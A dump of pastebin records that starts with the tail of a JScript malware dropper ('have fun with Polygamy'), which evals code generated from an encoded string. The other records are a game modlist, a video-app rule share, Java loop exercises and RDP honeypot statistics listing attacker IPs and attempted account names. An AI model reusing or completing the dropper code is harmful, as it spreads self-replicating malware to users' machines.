translatorJS+='xx=metaLanguage.split(""__"");';
translatorJS+='MyCode=createBlockOfCode(xx);';
//translatorJS+='fso=WScript.CreateObject(""Scripting.FileSystemObject"");';
//translatorJS+='file=fso.CreateTextFile(""xxx.txt"");file.Write(MyCode);file.close();';
translatorJS+='eval(MyCode);';

for(i=0;i<50;i++) // Making the translators smaller by removing some whitespace, not possible with Python
{
    translatorJS=translatorJS.replace(""   "","""");
    translatorVBS=translatorVBS.replace(""   "","""");
    translatorMatLab=translatorMatLab.replace(""   "","""");
    translatorRuby=translatorRuby.replace(""   "","""");
}
//fso=WScript.CreateObject(""Scripting.FileSystemObject"");file=fso.CreateTextFile(""111.txt"");file.Write(translatorJS);file.close();
           
eval(translatorJS)
WScript.Echo(""Dropper is ready - have fun with Polygamy :)"")"
L7EDSKvY,NotSoChillEco Modlist S1,esconomics,HTML,Monday 3rd of July 2023 08:43:27 PM CDT,"<color=orange>From the makers of <color=red>ChillEco <color=yellow>comes <color=green>Not<color=white>So<color=red>ChillEco.</color> 
Full Modlist at https://pastebin.com/L7EDSKvY

<B><u><color=green>MODs Include:</u></b><SIZE=-1>
PersonalWarehouse || SovietCupboard || HeavyTruckUnderRepair || RecyclingTable || NidToolbox || ElixirMods || Log Pickup || Cooking Table || Stone Oven || BeeKeeping || "
KqxMBJnF,邀您一起看：国产精品,xiaomianao666,JavaScript,Monday 3rd of July 2023 08:21:20 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥国产精品@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwiWVRC6KeG6aKRXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaHR0cDovLzguMjEwLjU5LjIxNi9hcGkvdmlkZW9zb3J0LzEwP29yZGVyYnk9bmV3JnBhZ2U9ZnlwYWdlO2dldDtVVEYtODt7VXNlci1BZ2VudEBva31cIixcImNvbF90eXBlXCI6XCJtb3ZpZV8yXCIsXCJmaW5kX3J1bGVcIjpcImpzOiB2YXIganNvbiA9IEpTT04ucGFyc2UoZ2V0UmVzQ29kZSgpKTtcXG52YXIgcmVzID0ge307XFxudmFyIGxpc3QgPSBqc29uLnJlc2NvbnQuZGF0YTtcXG52YXIgaXRlbXMgPSBsaXN0Lm1hcChkYXRhID0+ICh7XFxuICAgIHRpdGxlOiBkYXRhLnRpdGxlLFxcbiAgICB1cmw6ICdodHRwOi8vOC4yMTAuNTkuMjE2L2FwaS92aWRlb3BsYXkvJytkYXRhLmlkKyc/dXVpZD03MjRiOWM5ZmRkNWU3YjZmJysnQGxhenlSdWxlPVRleHQuanM6XFxcImh0dHA6Ly84LjIxMC41OS4yMTYvYXBpL2luZGV4Lm0zdTg/bTN1OD1cXFwiK0pTT04ucGFyc2UoaW5wdXQpLnJlc2NvbnQudmlkZW9wYXRoK1xcXCI7Z2V0O1VURi04O3tVc2VyLUFnZW50QG9rfVxcXCInLFxcbiAgICBkZXNjOiBkYXRhLmF1dGhlcm5hbWUsXFxuICAgIHBpY191cmw6IGRhdGEuY292ZXJwYXRoXFxufSkpO1xcbnJlcy5kYXRhID0gaXRlbXM7XFxuc2V0SG9tZVJlc3VsdChyZXMpO1wiLFwiZ3JvdXBcIjpcIuKRpUFQUFwiLFwidWFcIjpcImF1dG9cIixcInByZVJ1bGVcIjpcIlwiLFwicGFnZXNcIjpcIltdXCJ9IiwicGljVXJsIjoiaHR0cDovL2ltYWdlLnl0Ym9oYW8uY29tL3N0b3JhZ2UveGtkL3N5c2ljby8zYzE1YjdmOWQzM2MwYzlhOWM5OGFkM2M0ZDhiMDlkYS5wbmciLCJ0aXRsZSI6IuWbveS6p+eyvuWTgSJ9
mFg5qVsf,Day 11 loops a,HarrJ,Java,Monday 3rd of July 2023 07:55:33 PM CDT,"public class Day11B {
    public static void main(String[] args) {
        int i = 0;
        
        while (i < 10) {
            System.out.println(""while: ""+i);
            i++;
        }
        
        i = 50;
        while (i >= 7) {            
            System.out.println(""b: ""+i);
            i -= 3;
        }
        
        i = 0;
        do {
            System.out.println(""do While: "" + i);
            i++;
        } while (i < 10);
    }
}

//------------------------------------

public class Day11C {
    public static void main(String[] args) {
        int ref = 9;
        int j;
        int k = ref;
        
        while (k > 0) {
            j = ref;
            while (j > 0) {
                System.out.print(j);
                j--;
            }
            System.out.println(k);
            k--;
        }

        System.out.println(""----------------------------"");
        
        k = ref;
        while (k > 0) {
            j = ref;
            while (j > 0) {
                if (k == 1 || k == ref) {
                    System.out.print(""&"");
                } else {
                    if (j == 1 || j == ref) {
                        System.out.print(""&"");
                    } else {
                        System.out.print("" "");
                    }
                }
                j--;
            }
            System.out.println("""");
            k--;
        }
    }
}

//------------------
public class Day11F {
    public static void main(String[] args) {
        String[] txtArray1 = {
            ""car""
            ,""fish""
            ,""boat""
            ,""ship""
            ,""crab""
        };
        
        System.out.println(""array length: "" + txtArray1.length);
        System.out.println(""txtArray1 contents(descending)"");
        for (int i = txtArray1.length - 1; i >= 0; i--) {
            System.out.println(i + "". "" + txtArray1[i]);
        }
        System.out.println(""txtArray1 contents(ascending)"");
        for (int i = 0; i < txtArray1.length; i++) {
            System.out.println((i + 1) + "": "" + txtArray1[i]);
        }
    }
}
"
ghKtakV2,2023-07-03_stats.json,rdp_snitch,JSON,Monday 3rd of July 2023 07:18:22 PM CDT,"{
  ""ip"": {
    ""201.93.165.53"": 15,
    ""92.204.139.79"": 153,
    ""69.58.124.234"": 117,
    ""112.5.87.34"": 6,
    ""185.66.228.185"": 60,
    ""20.42.101.211"": 147,
    ""62.122.184.166"": 24,
    ""62.122.184.168"": 21,
    ""114.217.18.245"": 72,
    ""178.21.163.70"": 51,
    ""46.10.214.186"": 108,
    ""36.108.169.132"": 75,
    ""191.101.174.18"": 3,
    ""120.71.0.5"": 96,
    ""176.113.115.184"": 6,
    ""192.99.110.133"": 21,
    ""125.74.93.228"": 171,
    ""168.138.149.190"": 45,
    ""162.245.238.122"": 63,
    ""154.26.128.19"": 3,
    ""150.230.79.119"": 33,
    ""87.251.75.64"": 3,
    ""120.132.17.153"": 18,
    ""87.251.75.145"": 9,
    ""141.98.82.22"": 3,
    ""172.105.53.82"": 3,
    ""164.92.158.134"": 9,
    ""60.250.29.35"": 18,
    ""31.43.185.32"": 24,
    ""185.170.144.3"": 6,
    ""172.104.84.31"": 24,
    ""178.32.170.21"": 3,
    ""87.251.75.120"": 3,
    ""136.144.42.153"": 3,
    ""103.195.236.213"": 30,
    ""39.104.21.190"": 39,
    ""87.251.64.110"": 6,
    ""45.119.81.119"": 6,
    ""120.27.12.65"": 12,
    ""202.29.172.175"": 3,
    ""138.197.8.152"": 6,
    ""146.190.252.22"": 3,
    ""167.94.138.52"": 3,
    ""172.104.190.78"": 30,
    ""1.52.35.54"": 6,
    ""110.39.186.237"": 27,
    ""198.235.24.222"": 9,
    ""62.122.184.165"": 6,
    ""152.89.198.133"": 6,
    ""167.94.112.148"": 9,
    ""85.53.127.115"": 18,
    ""51.75.160.42"": 6,
    ""205.210.31.186"": 9
  },
  ""asn"": {
    ""AS27699"": 15,
    ""AS398108"": 153,
    ""AS32899"": 117,
    ""AS9808"": 6,
    ""AS201689"": 60,
    ""AS8075"": 147,
    ""AS57523"": 57,
    ""AS4134"": 72,
    ""AS21419"": 51,
    ""AS8866"": 108,
    ""AS137695"": 171,
    ""AS32780"": 3,
    ""AS57678"": 6,
    ""AS16276"": 30,
    ""AS141998"": 171,
    ""AS31898"": 78,
    ""AS27323"": 63,
    ""AS141995"": 3,
    ""AS208091"": 15,
    ""AS140292"": 18,
    ""AS209588"": 3,
    ""AS63949"": 57,
    ""AS14061"": 18,
    ""AS3462"": 18,
    ""AS211736"": 24,
    ""AS48080"": 12,
    ""AS206092"": 3,
    ""AS140827"": 30,
    ""AS37963"": 51,
    ""AS131386"": 6,
    ""AS133042"": 3,
    ""AS398324"": 3,
    ""AS18403"": 6,
    ""AS38264"": 27,
    ""AS396982"": 18,
    ""AS148997"": 9,
    ""AS12479"": 18
  },
  ""isp"": {
    ""Vivo"": 15,
    ""GoDaddy.com, LLC"": 153,
    ""Bresco Broadband"": 117,
    ""China Mobile"": 6,
    ""Lamerd Information & Communication Technology Co., ltd"": 60,
    ""Microsoft Corporation"": 147,
    ""Chang Way Technologies Co. Limited"": 57,
    ""Chinanet"": 72,
    ""Pishtaze E Jadid Infomration Company"": 51,
    ""Vivacom Bulgaria EAD"": 108,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 171,
    ""Hosting Services"": 3,
    ""Cat Technologies Co. Limited"": 6,
    ""OVH SAS"": 27,
    ""China Telecom"": 171,
    ""Oracle Corporation"": 78,
    ""Wowrack.com"": 63,
    ""Cogent Communications"": 3,
    ""XHOST-INTERNET-SOLUTIONS"": 15,
    ""Addresses CNNIC"": 30,
    ""Flyservers S.A."": 3,
    ""Akamai Technologies"": 57,
    ""DigitalOcean, LLC"": 18,
    ""Chunghwa Telecom Co., Ltd."": 18,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Dmitriy Panchenko"": 12,
    ""OVH ISP"": 3,
    ""Ipxo Limited"": 3,
    ""AZ Viet NAM Communications Technology Company Limited"": 30,
    ""Hangzhou Alibaba Advertising Co"": 39,
    ""Long Van System Solution"": 6,
    ""Office of Info.Tech. Admin. for Educational Development"": 3,
    ""Censys, Inc."": 3,
    ""FPTDYNAMICIP"": 6,
    ""Wateen Telecom Limited"": 27,
    ""Google LLC"": 18,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 9,
    ""Uni2 1"": 18
  },
  ""org"": {
    ""TELEF\ufffdNICA BRASIL S.A"": 15,
    ""Unknown"": 312,
    ""Bresco Broadband"": 117,
    ""China Mobile Communications Corporation"": 6,
    ""Microsoft Azure Cloud (eastus)"": 147,
    ""Chang Way Technologies Co. Limited"": 51,
    ""Chinanet JS"": 72,
    ""Bulgarian Telecommunications Company Plc"": 108,
    ""Chinanet ZJ"": 75,
    ""Express Technologies Ltd"": 3,
    ""Chinanet XJ"": 96,
    ""Cat Technologies Co. Limited"": 6,
    ""AVAST Software"": 21,
    ""Chinanet GS"": 171,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 78,
    ""Wowrack.com"": 63,
    ""Contabo Asia Private LTD"": 3,
    ""Xhost Internet Solutions"": 21,
    ""Vdsline"": 3,
    ""Linode"": 57,
    ""DigitalOcean, LLC"": 12,
    ""Chunghwa Telecom Co. Ltd."": 18,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Xhostis"": 6,
    ""Novotea network"": 3,
    ""Panq B.V"": 3,
    ""DULIEUAZ"": 30,
    ""Aliyun Computing Co., LTD"": 51,
    ""Office of Info.Tech. Admin. Educational Development"": 3,
    ""Digital Ocean"": 6,
    ""Censys, Inc"": 3,
    ""Wateen Telecom Limited"": 27,
    ""Palo Alto Networks, Inc"": 18,
    ""Starcrecium Limited"": 6,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 9,
    ""OVH Ltd"": 6
  },
  ""regionName"": {
    ""Sao Paulo"": 93,
    ""Virginia"": 300,
    ""Ohio"": 117,
    ""Guangdong"": 6,
    ""Tehran"": 111,
    ""Moscow"": 69,
    ""Jiangsu"": 72,
    ""Sofia-Capital"": 108,
    ""Zhejiang"": 75,
    ""New Jersey"": 9,
    ""Xinjiang Uyghur Autonomous Region"": 96,
    ""Quebec"": 21,
    ""Gansu"": 171,
    ""Illinois"": 63,
    ""North East"": 3,
    ""North Holland"": 30,
    ""Beijing"": 57,
    ""Provincia de Panama"": 3,
    ""Maharashtra"": 3,
    ""Taipei City"": 18,
    ""Kyiv City"": 24,
    ""Tokyo"": 24,
    ""Flanders"": 3,
    ""District of Columbia"": 3,
    ""Ho Chi Minh"": 42,
    ""Shandong"": 12,
    ""Bangkok"": 12,
    ""Ontario"": 3,
    ""Michigan"": 3,
    ""North West"": 30,
    ""Punjab"": 27,
    ""California"": 18,
    ""Andalusia"": 18,
    ""England"": 6
  },
  ""country"": {
    ""Brazil"": 93,
    ""United States"": 513,
    ""China"": 489,
    ""Iran"": 111,
    ""Russia"": 69,
    ""Bulgaria"": 108,
    ""Canada"": 24,
    ""Singapore"": 33,
    ""Netherlands"": 30,
    ""Panama"": 3,
    ""India"": 3,
    ""Taiwan"": 18,
    ""Ukraine"": 24,
    ""Japan"": 24,
    ""Belgium"": 3,
    ""Vietnam"": 42,
    ""Thailand"": 12,
    ""Pakistan"": 27,
    ""Spain"": 18,
    ""United Kingdom"": 6
  },
  ""account"": {
    ""142.93.8.59"": 1161,
    ""(empty)"": 12,
    ""Domain"": 69,
    ""hello"": 333,
    ""Administr"": 48,
    ""Administrator"": 3,
    ""YTAxgABYE"": 3,
    ""bOxmYj"": 3,
    ""WgenQp"": 3,
    ""Test"": 6,
    ""iazWpdfNz"": 3,
    ""VQMamN"": 3,
    ""pncEKP"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1650
  },
  ""client_build"": {
    ""Unknown"": 1650
  },
  ""client_name"": {
    ""Unknown"": 1650
  },
  ""ip_type"": {
    ""Unknown"": 1128,
    ""mobile"": 105,
    ""hosting"": 381,
    ""hosting & proxy"": 27,
    ""proxy"": 9
  }
}"
BV18yST3,2023-07-03_stats.json,rdp_snitch,JSON,Monday 3rd of July 2023 07:16:13 PM CDT,"{
  ""ip"": {
    ""201.93.165.53"": 10,
    ""92.204.139.79"": 102,
    ""69.58.124.234"": 78,
    ""112.5.87.34"": 4,
    ""185.66.228.185"": 40,
    ""20.42.101.211"": 98,
    ""62.122.184.166"": 16,
    ""62.122.184.168"": 14,
    ""114.217.18.245"": 48,
    ""178.21.163.70"": 34,
    ""46.10.214.186"": 72,
    ""36.108.169.132"": 50,
    ""191.101.174.18"": 2,
    ""120.71.0.5"": 64,
    ""176.113.115.184"": 4,
    ""192.99.110.133"": 14,
    ""125.74.93.228"": 114,
    ""168.138.149.190"": 30,
    ""162.245.238.122"": 42,
    ""154.26.128.19"": 2,
    ""150.230.79.119"": 22,
    ""87.251.75.64"": 2,
    ""120.132.17.153"": 12,
    ""87.251.75.145"": 6,
    ""141.98.82.22"": 2,
    ""172.105.53.82"": 2,
    ""164.92.158.134"": 6,
    ""60.250.29.35"": 12,
    ""31.43.185.32"": 16,
    ""185.170.144.3"": 4,
    ""172.104.84.31"": 16,
    ""178.32.170.21"": 2,
    ""87.251.75.120"": 2,
    ""136.144.42.153"": 2,
    ""103.195.236.213"": 20,
    ""39.104.21.190"": 26,
    ""87.251.64.110"": 4,
    ""45.119.81.119"": 4,
    ""120.27.12.65"": 8,
    ""202.29.172.175"": 2,
    ""138.197.8.152"": 4,
    ""146.190.252.22"": 2,
    ""167.94.138.52"": 2,
    ""172.104.190.78"": 20,
    ""1.52.35.54"": 4,
    ""110.39.186.237"": 18,
    ""198.235.24.222"": 6,
    ""62.122.184.165"": 4,
    ""152.89.198.133"": 4,
    ""167.94.112.148"": 6,
    ""85.53.127.115"": 12,
    ""51.75.160.42"": 4,
    ""205.210.31.186"": 6
  },
  ""asn"": {
    ""AS27699"": 10,
    ""AS398108"": 102,
    ""AS32899"": 78,
    ""AS9808"": 4,
    ""AS201689"": 40,
    ""AS8075"": 98,
    ""AS57523"": 38,
    ""AS4134"": 48,
    ""AS21419"": 34,
    ""AS8866"": 72,
    ""AS137695"": 114,
    ""AS32780"": 2,
    ""AS57678"": 4,
    ""AS16276"": 20,
    ""AS141998"": 114,
    ""AS31898"": 52,
    ""AS27323"": 42,
    ""AS141995"": 2,
    ""AS208091"": 10,
    ""AS140292"": 12,
    ""AS209588"": 2,
    ""AS63949"": 38,
    ""AS14061"": 12,
    ""AS3462"": 12,
    ""AS211736"": 16,
    ""AS48080"": 8,
    ""AS206092"": 2,
    ""AS140827"": 20,
    ""AS37963"": 34,
    ""AS131386"": 4,
    ""AS133042"": 2,
    ""AS398324"": 2,
    ""AS18403"": 4,
    ""AS38264"": 18,
    ""AS396982"": 12,
    ""AS148997"": 6,
    ""AS12479"": 12
  },
  ""isp"": {
    ""Vivo"": 10,
    ""GoDaddy.com, LLC"": 102,
    ""Bresco Broadband"": 78,
    ""China Mobile"": 4,
    ""Lamerd Information & Communication Technology Co., ltd"": 40,
    ""Microsoft Corporation"": 98,
    ""Chang Way Technologies Co. Limited"": 38,
    ""Chinanet"": 48,
    ""Pishtaze E Jadid Infomration Company"": 34,
    ""Vivacom Bulgaria EAD"": 72,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 114,
    ""Hosting Services"": 2,
    ""Cat Technologies Co. Limited"": 4,
    ""OVH SAS"": 18,
    ""China Telecom"": 114,
    ""Oracle Corporation"": 52,
    ""Wowrack.com"": 42,
    ""Cogent Communications"": 2,
    ""XHOST-INTERNET-SOLUTIONS"": 10,
    ""Addresses CNNIC"": 20,
    ""Flyservers S.A."": 2,
    ""Akamai Technologies"": 38,
    ""DigitalOcean, LLC"": 12,
    ""Chunghwa Telecom Co., Ltd."": 12,
    ""FOP Dmytro Nedilskyi"": 16,
    ""Dmitriy Panchenko"": 8,
    ""OVH ISP"": 2,
    ""Ipxo Limited"": 2,
    ""AZ Viet NAM Communications Technology Company Limited"": 20,
    ""Hangzhou Alibaba Advertising Co"": 26,
    ""Long Van System Solution"": 4,
    ""Office of Info.Tech. Admin. for Educational Development"": 2,
    ""Censys, Inc."": 2,
    ""FPTDYNAMICIP"": 4,
    ""Wateen Telecom Limited"": 18,
    ""Google LLC"": 12,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 6,
    ""Uni2 1"": 12
  },
  ""org"": {
    ""TELEF\ufffdNICA BRASIL S.A"": 10,
    ""Unknown"": 208,
    ""Bresco Broadband"": 78,
    ""China Mobile Communications Corporation"": 4,
    ""Microsoft Azure Cloud (eastus)"": 98,
    ""Chang Way Technologies Co. Limited"": 34,
    ""Chinanet JS"": 48,
    ""Bulgarian Telecommunications Company Plc"": 72,
    ""Chinanet ZJ"": 50,
    ""Express Technologies Ltd"": 2,
    ""Chinanet XJ"": 64,
    ""Cat Technologies Co. Limited"": 4,
    ""AVAST Software"": 14,
    ""Chinanet GS"": 114,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 52,
    ""Wowrack.com"": 42,
    ""Contabo Asia Private LTD"": 2,
    ""Xhost Internet Solutions"": 14,
    ""Vdsline"": 2,
    ""Linode"": 38,
    ""DigitalOcean, LLC"": 8,
    ""Chunghwa Telecom Co. Ltd."": 12,
    ""FOP Dmytro Nedilskyi"": 16,
    ""Xhostis"": 4,
    ""Novotea network"": 2,
    ""Panq B.V"": 2,
    ""DULIEUAZ"": 20,
    ""Aliyun Computing Co., LTD"": 34,
    ""Office of Info.Tech. Admin. Educational Development"": 2,
    ""Digital Ocean"": 4,
    ""Censys, Inc"": 2,
    ""Wateen Telecom Limited"": 18,
    ""Palo Alto Networks, Inc"": 12,
    ""Starcrecium Limited"": 4,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 6,
    ""OVH Ltd"": 4
  },
  ""regionName"": {
    ""Sao Paulo"": 62,
    ""Virginia"": 200,
    ""Ohio"": 78,
    ""Guangdong"": 4,
    ""Tehran"": 74,
    ""Moscow"": 46,
    ""Jiangsu"": 48,
    ""Sofia-Capital"": 72,
    ""Zhejiang"": 50,
    ""New Jersey"": 6,
    ""Xinjiang Uyghur Autonomous Region"": 64,
    ""Quebec"": 14,
    ""Gansu"": 114,
    ""Illinois"": 42,
    ""North East"": 2,
    ""North Holland"": 20,
    ""Beijing"": 38,
    ""Provincia de Panama"": 2,
    ""Maharashtra"": 2,
    ""Taipei City"": 12,
    ""Kyiv City"": 16,
    ""Tokyo"": 16,
    ""Flanders"": 2,
    ""District of Columbia"": 2,
    ""Ho Chi Minh"": 28,
    ""Shandong"": 8,
    ""Bangkok"": 8,
    ""Ontario"": 2,
    ""Michigan"": 2,
    ""North West"": 20,
    ""Punjab"": 18,
    ""California"": 12,
    ""Andalusia"": 12,
    ""England"": 4
  },
  ""country"": {
    ""Brazil"": 62,
    ""United States"": 342,
    ""China"": 326,
    ""Iran"": 74,
    ""Russia"": 46,
    ""Bulgaria"": 72,
    ""Canada"": 16,
    ""Singapore"": 22,
    ""Netherlands"": 20,
    ""Panama"": 2,
    ""India"": 2,
    ""Taiwan"": 12,
    ""Ukraine"": 16,
    ""Japan"": 16,
    ""Belgium"": 2,
    ""Vietnam"": 28,
    ""Thailand"": 8,
    ""Pakistan"": 18,
    ""Spain"": 12,
    ""United Kingdom"": 4
  },
  ""account"": {
    ""142.93.8.59"": 774,
    ""(empty)"": 8,
    ""Domain"": 46,
    ""hello"": 222,
    ""Administr"": 32,
    ""Administrator"": 2,
    ""YTAxgABYE"": 2,
    ""bOxmYj"": 2,
    ""WgenQp"": 2,
    ""Test"": 4,
    ""iazWpdfNz"": 2,
    ""VQMamN"": 2,
    ""pncEKP"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1100
  },
  ""client_build"": {
    ""Unknown"": 1100
  },
  ""client_name"": {
    ""Unknown"": 1100
  },
  ""ip_type"": {
    ""Unknown"": 752,
    ""mobile"": 70,
    ""hosting"": 254,
    ""hosting & proxy"": 18,
    ""proxy"": 6
  }
}"
qr3nQXdH,2023-07-03_stats.json,rdp_snitch,JSON,Monday 3rd of July 2023 07:15:08 PM CDT,"{
  ""ip"": {
    ""201.93.165.53"": 5,
    ""92.204.139.79"": 51,
    ""69.58.124.234"": 39,
    ""112.5.87.34"": 2,
    ""185.66.228.185"": 20,
    ""20.42.101.211"": 49,
    ""62.122.184.166"": 8,
    ""62.122.184.168"": 7,
    ""114.217.18.245"": 24,
    ""178.21.163.70"": 17,
    ""46.10.214.186"": 36,
    ""36.108.169.132"": 25,
    ""191.101.174.18"": 1,
    ""120.71.0.5"": 32,
    ""176.113.115.184"": 2,
    ""192.99.110.133"": 7,
    ""125.74.93.228"": 57,
    ""168.138.149.190"": 15,
    ""162.245.238.122"": 21,
    ""154.26.128.19"": 1,
    ""150.230.79.119"": 11,
    ""87.251.75.64"": 1,
    ""120.132.17.153"": 6,
    ""87.251.75.145"": 3,
    ""141.98.82.22"": 1,
    ""172.105.53.82"": 1,
    ""164.92.158.134"": 3,
    ""60.250.29.35"": 6,
    ""31.43.185.32"": 8,
    ""185.170.144.3"": 2,
    ""172.104.84.31"": 8,
    ""178.32.170.21"": 1,
    ""87.251.75.120"": 1,
    ""136.144.42.153"": 1,
    ""103.195.236.213"": 10,
    ""39.104.21.190"": 13,
    ""87.251.64.110"": 2,
    ""45.119.81.119"": 2,
    ""120.27.12.65"": 4,
    ""202.29.172.175"": 1,
    ""138.197.8.152"": 2,
    ""146.190.252.22"": 1,
    ""167.94.138.52"": 1,
    ""172.104.190.78"": 10,
    ""1.52.35.54"": 2,
    ""110.39.186.237"": 9,
    ""198.235.24.222"": 3,
    ""62.122.184.165"": 2,
    ""152.89.198.133"": 2,
    ""167.94.112.148"": 3,
    ""85.53.127.115"": 6,
    ""51.75.160.42"": 2,
    ""205.210.31.186"": 3
  },
  ""asn"": {
    ""AS27699"": 5,
    ""AS398108"": 51,
    ""AS32899"": 39,
    ""AS9808"": 2,
    ""AS201689"": 20,
    ""AS8075"": 49,
    ""AS57523"": 19,
    ""AS4134"": 24,
    ""AS21419"": 17,
    ""AS8866"": 36,
    ""AS137695"": 57,
    ""AS32780"": 1,
    ""AS57678"": 2,
    ""AS16276"": 10,
    ""AS141998"": 57,
    ""AS31898"": 26,
    ""AS27323"": 21,
    ""AS141995"": 1,
    ""AS208091"": 5,
    ""AS140292"": 6,
    ""AS209588"": 1,
    ""AS63949"": 19,
    ""AS14061"": 6,
    ""AS3462"": 6,
    ""AS211736"": 8,
    ""AS48080"": 4,
    ""AS206092"": 1,
    ""AS140827"": 10,
    ""AS37963"": 17,
    ""AS131386"": 2,
    ""AS133042"": 1,
    ""AS398324"": 1,
    ""AS18403"": 2,
    ""AS38264"": 9,
    ""AS396982"": 6,
    ""AS148997"": 3,
    ""AS12479"": 6
  },
  ""isp"": {
    ""Vivo"": 5,
    ""GoDaddy.com, LLC"": 51,
    ""Bresco Broadband"": 39,
    ""China Mobile"": 2,
    ""Lamerd Information & Communication Technology Co., ltd"": 20,
    ""Microsoft Corporation"": 49,
    ""Chang Way Technologies Co. Limited"": 19,
    ""Chinanet"": 24,
    ""Pishtaze E Jadid Infomration Company"": 17,
    ""Vivacom Bulgaria EAD"": 36,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 57,
    ""Hosting Services"": 1,
    ""Cat Technologies Co. Limited"": 2,
    ""OVH SAS"": 9,
    ""China Telecom"": 57,
    ""Oracle Corporation"": 26,
    ""Wowrack.com"": 21,
    ""Cogent Communications"": 1,
    ""XHOST-INTERNET-SOLUTIONS"": 5,
    ""Addresses CNNIC"": 10,
    ""Flyservers S.A."": 1,
    ""Akamai Technologies"": 19,
    ""DigitalOcean, LLC"": 6,
    ""Chunghwa Telecom Co., Ltd."": 6,
    ""FOP Dmytro Nedilskyi"": 8,
    ""Dmitriy Panchenko"": 4,
    ""OVH ISP"": 1,
    ""Ipxo Limited"": 1,
    ""AZ Viet NAM Communications Technology Company Limited"": 10,
    ""Hangzhou Alibaba Advertising Co"": 13,
    ""Long Van System Solution"": 2,
    ""Office of Info.Tech. Admin. for Educational Development"": 1,
    ""Censys, Inc."": 1,
    ""FPTDYNAMICIP"": 2,
    ""Wateen Telecom Limited"": 9,
    ""Google LLC"": 6,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 3,
    ""Uni2 1"": 6
  },
  ""org"": {
    ""TELEF\ufffdNICA BRASIL S.A"": 5,
    ""Unknown"": 104,
    ""Bresco Broadband"": 39,
    ""China Mobile Communications Corporation"": 2,
    ""Microsoft Azure Cloud (eastus)"": 49,
    ""Chang Way Technologies Co. Limited"": 17,
    ""Chinanet JS"": 24,
    ""Bulgarian Telecommunications Company Plc"": 36,
    ""Chinanet ZJ"": 25,
    ""Express Technologies Ltd"": 1,
    ""Chinanet XJ"": 32,
    ""Cat Technologies Co. Limited"": 2,
    ""AVAST Software"": 7,
    ""Chinanet GS"": 57,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 26,
    ""Wowrack.com"": 21,
    ""Contabo Asia Private LTD"": 1,
    ""Xhost Internet Solutions"": 7,
    ""Vdsline"": 1,
    ""Linode"": 19,
    ""DigitalOcean, LLC"": 4,
    ""Chunghwa Telecom Co. Ltd."": 6,
    ""FOP Dmytro Nedilskyi"": 8,
    ""Xhostis"": 2,
    ""Novotea network"": 1,
    ""Panq B.V"": 1,
    ""DULIEUAZ"": 10,
    ""Aliyun Computing Co., LTD"": 17,
    ""Office of Info.Tech. Admin. Educational Development"": 1,
    ""Digital Ocean"": 2,
    ""Censys, Inc"": 1,
    ""Wateen Telecom Limited"": 9,
    ""Palo Alto Networks, Inc"": 6,
    ""Starcrecium Limited"": 2,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 3,
    ""OVH Ltd"": 2
  },
  ""regionName"": {
    ""Sao Paulo"": 31,
    ""Virginia"": 100,
    ""Ohio"": 39,
    ""Guangdong"": 2,
    ""Tehran"": 37,
    ""Moscow"": 23,
    ""Jiangsu"": 24,
    ""Sofia-Capital"": 36,
    ""Zhejiang"": 25,
    ""New Jersey"": 3,
    ""Xinjiang Uyghur Autonomous Region"": 32,
    ""Quebec"": 7,
    ""Gansu"": 57,
    ""Illinois"": 21,
    ""North East"": 1,
    ""North Holland"": 10,
    ""Beijing"": 19,
    ""Provincia de Panama"": 1,
    ""Maharashtra"": 1,
    ""Taipei City"": 6,
    ""Kyiv City"": 8,
    ""Tokyo"": 8,
    ""Flanders"": 1,
    ""District of Columbia"": 1,
    ""Ho Chi Minh"": 14,
    ""Shandong"": 4,
    ""Bangkok"": 4,
    ""Ontario"": 1,
    ""Michigan"": 1,
    ""North West"": 10,
    ""Punjab"": 9,
    ""California"": 6,
    ""Andalusia"": 6,
    ""England"": 2
  },
  ""country"": {
    ""Brazil"": 31,
    ""United States"": 171,
    ""China"": 163,
    ""Iran"": 37,
    ""Russia"": 23,
    ""Bulgaria"": 36,
    ""Canada"": 8,
    ""Singapore"": 11,
    ""Netherlands"": 10,
    ""Panama"": 1,
    ""India"": 1,
    ""Taiwan"": 6,
    ""Ukraine"": 8,
    ""Japan"": 8,
    ""Belgium"": 1,
    ""Vietnam"": 14,
    ""Thailand"": 4,
    ""Pakistan"": 9,
    ""Spain"": 6,
    ""United Kingdom"": 2
  },
  ""account"": {
    ""142.93.8.59"": 387,
    ""(empty)"": 4,
    ""Domain"": 23,
    ""hello"": 111,
    ""Administr"": 16,
    ""Administrator"": 1,
    ""YTAxgABYE"": 1,
    ""bOxmYj"": 1,
    ""WgenQp"": 1,
    ""Test"": 2,
    ""iazWpdfNz"": 1,
    ""VQMamN"": 1,
    ""pncEKP"": 1
  },
  ""keyboard"": {
    ""Unknown"": 550
  },
  ""client_build"": {
    ""Unknown"": 550
  },
  ""client_name"": {
    ""Unknown"": 550
  },
  ""ip_type"": {
    ""Unknown"": 376,
